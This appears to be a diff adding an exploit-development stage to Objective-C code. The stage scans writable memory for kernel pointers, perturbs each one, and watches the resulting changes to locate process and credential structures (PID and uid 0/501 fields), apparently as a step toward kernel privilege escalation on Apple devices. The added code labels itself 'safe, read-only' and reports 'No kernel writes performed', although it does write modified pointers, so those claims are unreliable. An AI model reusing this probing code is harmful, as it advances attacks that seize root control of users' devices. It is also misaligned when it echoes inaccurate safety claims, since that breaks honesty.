@@ -362,6 +362,101 @@ static BOOL isKernelPointer(uint64_t v) {
         [report appendString:@"Try: modify kptrs in different regions, or use translate_receive bit-set.\n"];
     }
 
+    // --- Phase 8: safe structure analysis from output diffs ---
+    // Read-only: modify kptr by +0x100, record ALL diffs, restore.
+    // Build a map: kptr -> affected fields. Identify proc/ucred patterns.
+    [report appendString:@"\n--- Phase 8: structure analysis (safe, read-only) ---\n"];
+
+    scanAddr = 0; scanSize = 0;
+    int structuresFound = 0;
+
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint32_t d8 = 0;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d8,
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+        if (scanSize > 16 * 1024 * 1024) continue;
+
+        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+
+        uint64_t *snap = malloc(scanSize);
+        if (!snap) continue;
+        memcpy(snap, (void *)scanAddr, scanSize);
+
+        // For each kernel pointer, record its diffs
+        for (size_t i = 0; i < words && structuresFound < 10; i++) {
+            uint64_t v = rp[i];
+            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
+            if ((v & 0xfff) == 0xfff) continue;
+
+            rp[i] = v + 0x100;
+            usleep(200);
+
+            // Collect all diffs
+            int nd = 0;
+            uint64_t diffs[16] = {0};
+            uint64_t diffs_was[16] = {0};
+            size_t diffs_off[16] = {0};
+
+            for (size_t j = 0; j < words && nd < 16; j++) {
+                if (j == i) continue;
+                if (rp[j] != snap[j]) {
+                    diffs_off[nd] = j * 8;
+                    diffs_was[nd] = snap[j];
+                    diffs[nd] = rp[j];
+                    nd++;
+                }
+            }
+
+            rp[i] = v; // restore
+            usleep(100);
+
+            if (nd >= 2) {
+                // Analyze diff pattern
+                [report appendFormat:@"\nkptr[+0x%zx] = 0x%llx -> %d diffs:\n", i * 8, v, nd];
+                for (int d = 0; d < nd; d++) {
+                    uint64_t delta = (diffs[d] > diffs_was[d]) ? diffs[d] - diffs_was[d] : diffs_was[d] - diffs[d];
+                    [report appendFormat:@"  [+0x%zx] 0x%llx -> 0x%llx (delta=0x%llx)\n",
+                     diffs_off[d], diffs_was[d], diffs[d], delta];
+                }
+
+                // Check for proc-like pattern: PID field nearby
+                int myPID = getpid();
+                for (int d = 0; d < nd; d++) {
+                    uint32_t lo = (uint32_t)(diffs[d] & 0xffffffff);
+                    uint32_t hi = (uint32_t)(diffs[d] >> 32);
+                    if (lo == (uint32_t)myPID || hi == (uint32_t)myPID) {
+                        [report appendFormat:@"  *** PID found in diff at +0x%zx! ***\n", diffs_off[d]];
+                    }
+                }
+
+                // Check for ucred-like pattern: uid value (501 or 0)
+                for (int d = 0; d < nd; d++) {
+                    uint32_t lo = (uint32_t)(diffs[d] & 0xffffffff);
+                    uint32_t hi = (uint32_t)(diffs[d] >> 32);
+                    if (lo == 501 || lo == 0 || hi == 501 || hi == 0) {
+                        if (diffs_was[d] != 0 || diffs[d] != 0) {
+                            [report appendFormat:@"  possible uid field at +0x%zx: %u/%u -> %u/%u\n",
+                             diffs_off[d], lo, hi, (uint32_t)(diffs[d] & 0xffffffff), (uint32_t)(diffs[d] >> 32)];
+                        }
+                    }
+                }
+
+                structuresFound++;
+            }
+        }
+
+        free(snap);
+        if (structuresFound >= 10) break;
+    }
+
+    [report appendFormat:@"\nstructures analyzed: %d\n", structuresFound];
+    [report appendString:@"Read-only analysis complete. No kernel writes performed.\n"];
+
     // --- Verdict ---
     [report appendString:@"\n"];
     if (kptrCount > 0) {
